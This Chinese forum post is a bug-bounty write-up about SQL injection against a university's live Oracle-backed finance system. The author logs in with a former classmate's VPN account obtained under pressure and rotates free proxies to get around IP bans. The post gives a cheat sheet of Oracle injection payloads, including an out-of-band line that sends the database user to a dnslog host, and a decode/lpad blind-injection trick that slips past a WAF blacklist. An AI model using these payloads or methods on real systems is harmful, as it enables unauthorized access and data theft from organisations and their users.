# 【漏洞挖掘】记一次985证书站Oracle注入绕WAF

> **来源**: https://forum.butian.net/share/2996  
> **文章ID**: 2996

---

0x01 前言
=======

> 看到某985证书挺好看的，我也很想拿一个。碰巧高中舍友是这个学校的，在一番“威逼利诱”下，他也是乖乖地交出了自己的校园VPN账号。

0x02 发现注入点
==========

1、因为有了VPN账号密码，所以出洞应该不是什么问题。所以我省去了信息收集的步骤，直接登录其教务处、财务处等核心系统测试。最后也是很快地在其财务系统发现了疑似注入点，如下图所示。

![image.png](images/attach-24504d959a7b980854e9fa332a70601183de9fbc.png)

2、如上图所示，在“支出金额范围（元）”处输入个英文单引号，再点击左上角的“按条件查询”，回显Oracle数据库报错，报错信息为单引号未正确终止。如下图所示。

![image.png](images/attach-b46035fbaa5ebba448aebdd54317527a77ad0e54.png)

0x03 Oracle注入学习
===============

**【联合查询注入】**

```php
/?id=1 order by 3 --+ 判断列数
```

```php
/?id=-1 union select null,null,null from dual --+ 获取显位
/?id=-1 union select 1,'2','3' from dual --+ 获取显位
```

```php
/?id=-1 union select 1,(select username from all_users where rownum=1),'3' from dual --+  获取用户名（相当于MYSQL的库名）
```

```php
/?id=-1' union select NULL,(select table_name from user_tables where rownum=1 and owner='XXX'),NULL from dual--+ 获取XXX用户下的表名
```

```php
/?id=-1 union select 1,(select column_name from all_tab_columns where owner='XXX' and table_name='USER' and rownum=1),'3' from dual --+ 获取XXX用户下USER表的字段
```

```php
/?id=-1 union select 1,(select concat(concat(username,'~~'),password) from users where rownum=1),null from dual --+ 获取数据
```

**【报错注入】**

```php
/?id=-1' or 1=ctxsys.drithsx.sn(1,'~'%7c%7c(select user from dual)%7c%7c'~') --+
```

```php
/?id=-1' or (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select user from dual)%7c%7cchr(62))) from dual) is not null --+
```

```php
/?id=-1' or (select dbms_xdb_version.checkin('~'%7c%7c(select user from dual)%7c%7c'~') from dual) is not null--+
```

**【布尔盲注】**

```php
/?id=1 and (select ascii(substr(user,1,1))from dual)>65 --+
```

**【时间盲注】**

```php
/?id=1' and 1=(case when (ascii(substr((select user from dual),1,1))>65) then dbms_pipe.receive_message('RDS',5) else 0 end) --+
```

**【DNSLOG带外注入】**

```php
/?id=1 and utl_http.request('http://'%7c%7c(select user from dual)%7c%7c'.xxxxxx.dnslog.cn/oracle')=1 --+
```

0x04 尝试注入
=========

1、有了上面的笔记，我心想应该很快就能注出来，已经开好漏洞提交的页面准备边注边写报告了，结果payload一贴。。

![467ad7495fa2658f92e5511f852b73fc.jpg](images/attach-124658b6cbe728daa37957ced9e72ee1756a55d3.jpg)

2、直接封IP也是难绷。去在线代理池找点免费代理挂上继续测。用上我CTF常年划水的功底，一顿双写大小写编码绕过，但都快把免费IP用完了还是不行。WAF一检测到select、substr、length、instr、ascii等常见函数就会封IP。没办法只能先去搜搜其他师傅的Oracle注入实战贴。发现有decode()这个函数可用。

```php
decode(表达式,value,value1,value2)
```

这个函数的意思是当“表达式”的运算结果等于"value"时，decode函数输出value1；反之若不等，则输出value2。那么我们就可以在“表达式”处逐个字符猜解，结合Oracle除数为0会有特殊报错的特性进行盲注。

![926d64e497da833f9f3803b83f656467.jpg](images/attach-5c661f0fafc16cc6c27050e7980cb8bbcdc0abf6.jpg)

3、那么问题来了。decode函数里面的盲注表达式该用什么呢？常见的那些根本没得用，掉小珍珠了。只能先去查查Oracle手册，找点不在WAF黑名单里的冷门函数。也是边找边学，最后发现了lpad()这个字符串填充函数似乎可以一试。

```php
lpad(string, padded_length, [pad_string])
string: 这是你想要填充的原始字符串。  
padded_length: 指定结果字符串的总长度。如果这个长度小于原始字符串的长度，那么原始字符串将被截取到指定长度。  
pad_string: （可选）用于填充的字符或字符串。如果未指定，默认使用空格字符进行填充。
```

简单说一下，就是如果当前Oracle用户名为wangzi，那么**lpad(user,1,1)** 就为w，**lpad(user,2,1)** 就为wa。而**lpad(user,9,6)** 将输出666wangzi，填充了pad\_string位的字符6到左侧，以让输出的字符串达到九位。

4、最终，我们构造出盲注语句**1/decode(lpad(user,1,1),'A',1,0)** ,将其输入在“支出金额范围（元）”处，并点击查询，发现正常报错回显除数为0。说明当前连接的用户名第一个字符不为A。如图所示。

![image.png](images/attach-cf57fc04480853afd9dc8a30873b4b9a273d9dfa.png)

5、以此类推，再继续构造盲注语句**1/decode(lpad(user,1,1),'C',1,0)** ,将其输入在“支出金额范围（元）”处，并点击查询，发现报错回显查询结果超过控制数。证明payload运算结果为1，即当前连接的用户名第一个字符为C。若将此处的C换成其他任何字符，回显都是除数为0。如图所示。

![image.png](images/attach-66ca4d21ac50320dea37610e8ee9062a2ee5782a.png)

6、再继续构造盲注语句**1/decode(lpad(user,2,1),'CA',1,0)** ,将其输入在“支出金额范围（元）”处，并点击查询，发现报错回显仍是除数为0。说明当前的用户名第二个字符不为A。如图所示。

![image.png](images/attach-e849ec54120a6fc0a40091202d1afdeb43be9c99.png)

7、如此以来不断遍历字符测试，直到构造出**1/decode(lpad(user,2,1),'CW',1,0)** 。将其输入在“支出金额范围（元）”处，并点击查询，发现报错回显的是查询结果超过控制数。证明payload运算结果为1，即当前连接的用户名第二个字符为W。若将此处的W换成其他任何字符，回显都是除数为0。如图所示。

![image.png](images/attach-65b36623c9162605bb8e7daf0f1b48eaaff6adf3.png)

8、同理，构造 **1/decode(lpad(user,3,1),'CWB',1,0)** 和**1/decode(lpad(user,4,1),'CWBS',1,0)** 时，回显不是除数为0，而是查询结果超过控制数。故我们通过盲注，成功得到了该Oracle数据库当前连接的用户名，即CWBS。遍历其它任何字符，盲注第五位的回显都是除数为0，故用户名只有4位。漏洞验证成功！

![image.png](images/attach-779076888031e630c4d16057e6b8f431f9a3addf.png)

0x05 结语
=======

因为这里的数据包是被全局加密的，而且WAF封得严，所以没能用BP或者脚本进行快速遍历字符进行盲注。不过弄到大半夜也算是勉强注出来了，坐等证书发货。若有不够严谨的地方，还请师傅们批评指正。
